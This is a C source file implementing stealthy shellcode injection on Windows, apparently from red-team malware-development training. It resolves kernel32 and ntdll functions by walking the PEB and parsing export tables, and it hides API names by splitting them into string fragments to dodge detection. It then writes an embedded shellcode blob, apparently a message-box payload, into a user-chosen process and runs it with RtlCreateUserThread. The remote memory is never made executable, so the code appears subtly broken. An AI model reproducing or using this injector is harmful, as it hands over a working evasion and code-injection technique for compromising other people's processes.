#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string.h>

void concatStrings(char* dest, const char* part1, const char* part2, const char* part3, const char* part4, const char* part5) {
    strcpy(dest, part1);
    strcat(dest, part2);
    strcat(dest, part3);
    strcat(dest, part4);
    strcat(dest, part5);
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID FastPebLockRoutine;
    PVOID FastPebUnlockRoutine;
    ULONG EnvironmentUpdateCount;
    PVOID KernelCallbackTable;
    PVOID EventLogSection;
    PVOID EventLog;
    PVOID FreeList;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    BYTE Spare2[4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;
    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    PVOID GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    ULONG OSBuildNumber;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG ActiveProcessAffinityMask;
    ULONG GdiHandleBuffer[34];
    PVOID PostProcessInitRoutine;
    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];
    ULONG SessionId;
} PEB, * PPEB;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _GDI_TEB_BATCH {
    ULONG Offset;
    ULONG HDC;
    ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB {
    NT_TIB NtTib;
    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;
    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
    UCHAR SpareBytes1[24];
    ULONG TxFsContext;
    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    PVOID Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;
    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];
    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;
    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];
    ULONG HardErrorMode;
    PVOID Instrumentation[11];
    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;
    BOOLEAN InDbgPrint;
    BOOLEAN FreeStackOnTermination;
    BOOLEAN HasFiberData;
    UCHAR IdealProcessor;
    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID TlsExpansionSlots;
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PVOID ActiveFrame;
    PVOID FlsData;
    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;
    USHORT CrossTebFlags;
    USHORT SameTebFlags;
    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    LONG WowTebOffset;
    PVOID ResourceRetValue;
    PVOID ReservedForWdf;
} TEB, * PTEB;

#define NtCurrentTeb() ((PTEB)__readgsqword(0x30))
#define NtCurrentPeb() ((PPEB)NtCurrentTeb()->ProcessEnvironmentBlock)

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientId
    );

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (hModule == NULL || lpProcName == NULL) {
        return NULL;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        if (strcmp((char*)hModule + pAddressOfNames[i], lpProcName) == 0) {
            return (FARPROC)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

LPVOID CustomVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    if (lpAddress == NULL) {
        lpAddress = (LPVOID)((DWORD_PTR)si.lpMinimumApplicationAddress + rand() % ((DWORD_PTR)si.lpMaximumApplicationAddress - (DWORD_PTR)si.lpMinimumApplicationAddress));
    }

    LPVOID result = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
    if (result == NULL) {
        result = VirtualAlloc(NULL, dwSize, flAllocationType, flProtect);
    }

    return result;
}

HMODULE CustomGetModuleHandle(LPCSTR lpModuleName) {
    if (lpModuleName == NULL) {
        return NULL;
    }

    PPEB pPeb = NtCurrentPeb();
    if (pPeb == NULL) {
        return NULL;
    }

    PLIST_ENTRY pListEntry = &pPeb->Ldr->InMemoryOrderModuleList;

    for (PLIST_ENTRY pCurrent = pListEntry->Flink; pCurrent != pListEntry; pCurrent = pCurrent->Flink) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        char moduleName[256];
        wcstombs(moduleName, pEntry->BaseDllName.Buffer, pEntry->BaseDllName.Length / sizeof(WCHAR));
        moduleName[pEntry->BaseDllName.Length / sizeof(WCHAR)] = '\0';

        if (_stricmp(moduleName, lpModuleName) == 0) {
            return (HMODULE)pEntry->DllBase;
        }
    }

    return NULL;
}

void InjectShellcode(DWORD processID, const char* shellcode, SIZE_T shellcodeSize) {
    char kernel32Dll[20];
    concatStrings(kernel32Dll, "k", "e", "r", "nel32", ".dll");

    HMODULE hKernel32 = CustomGetModuleHandle(kernel32Dll);
    if (hKernel32 == NULL) {
        return;
    }

    char openProcessName[20];
    concatStrings(openProcessName, "Op", "en", "Pro", "ces", "s");

    typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    pOpenProcess CustomOpenProcess = (pOpenProcess)CustomGetProcAddress(hKernel32, openProcessName);
    if (!CustomOpenProcess) {
        return;
    }

    HANDLE hProcess = CustomOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, processID);
    if (hProcess == NULL) {
        return;
    }

    char virtualAllocExName[20];
    concatStrings(virtualAllocExName, "Vi", "rt", "ual", "All", "ocEx");

    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAllocEx CustomVirtualAllocEx = (pVirtualAllocEx)CustomGetProcAddress(hKernel32, virtualAllocExName);
    if (!CustomVirtualAllocEx) {
        return;
    }

    char writeProcessMemoryName[30];
    concatStrings(writeProcessMemoryName, "Wri", "teP", "roc", "ess", "Memory");

    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    pWriteProcessMemory CustomWriteProcessMemory = (pWriteProcessMemory)CustomGetProcAddress(hKernel32, writeProcessMemoryName);
    if (!CustomWriteProcessMemory) {
        return;
    }

    char rtlCreateUserThreadName[30];
    concatStrings(rtlCreateUserThreadName, "Rtl", "Cre", "ate", "Use", "rThread");

    char ntDll[20];
    concatStrings(ntDll, "n", "t", "d", "ll.d", "ll");

    HMODULE hNtdll = CustomGetModuleHandle(ntDll);
    pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)CustomGetProcAddress(hNtdll, rtlCreateUserThreadName);
    if (!RtlCreateUserThread) {
        return;
    }

    char virtualFreeExName[20];
    concatStrings(virtualFreeExName, "Vir", "tua", "lFr", "eeE", "x");

    typedef BOOL(WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
    pVirtualFreeEx CustomVirtualFreeEx = (pVirtualFreeEx)CustomGetProcAddress(hKernel32, virtualFreeExName);
    if (!CustomVirtualFreeEx) {
        return;
    }

    char waitForSingleObjectName[30];
    concatStrings(waitForSingleObjectName, "Wai", "tFo", "rSi", "ngle", "Object");

    typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
    pWaitForSingleObject CustomWaitForSingleObject = (pWaitForSingleObject)CustomGetProcAddress(hKernel32, waitForSingleObjectName);
    if (!CustomWaitForSingleObject) {
        return;
    }

    char closeHandleName[20];
    concatStrings(closeHandleName, "Clo", "seH", "and", "le", "");

    typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
    pCloseHandle CustomCloseHandle = (pCloseHandle)CustomGetProcAddress(hKernel32, closeHandleName);
    if (!CustomCloseHandle) {
        return;
    }

    LPVOID pRemoteCode = CustomVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE, PAGE_NOACCESS);
    if (pRemoteCode == NULL) {
        CustomCloseHandle(hProcess);
        return;
    }

    if (!CustomVirtualAllocEx(hProcess, pRemoteCode, shellcodeSize, MEM_COMMIT, PAGE_READWRITE)) {
        CustomVirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CustomCloseHandle(hProcess);
        return;
    }

    if (!CustomWriteProcessMemory(hProcess, pRemoteCode, shellcode, shellcodeSize, NULL)) {
        CustomVirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CustomCloseHandle(hProcess);
        return;
    }

    HANDLE hThread;
    NTSTATUS status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, NULL, NULL, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);
    if (status != 0) {
        CustomVirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CustomCloseHandle(hProcess);
        return;
    }
    else {
        CustomWaitForSingleObject(hThread, INFINITE);
        CustomCloseHandle(hThread);
    }

    CustomVirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CustomCloseHandle(hProcess);
}

int main() {
    DWORD processID;
    char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    printf("vale thn istoria sou: ");
    scanf("%d", &processID);

    InjectShellcode(processID, shellcode, shellcodeSize);

    return 0;
}
